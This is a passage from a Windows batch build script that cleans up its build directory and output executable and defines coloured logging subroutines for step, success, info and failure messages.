    if exist "%BUILD_DIR%\" rmdir /s /q "%BUILD_DIR%"
    if exist "%FINAL_EXE_NAME%" del "%FINAL_EXE_NAME%" > nul 2>&1
goto :eof

:log_step
    echo %C_GREEN%[STEP] %~1%C_RESET%
    echo %C_CYAN%------------------------------------------------------------------%C_RESET%
goto :eof

:log_success
    echo %C_GREEN%[ OK ]%C_RESET% %~1
goto :eof

:log_info
    echo %C_GRAY%[INFO]%C_RESET% %~1
goto :eof

:log_error
    echo %C_RED%[FAIL]%C_RESET% %~1
goto :eof

```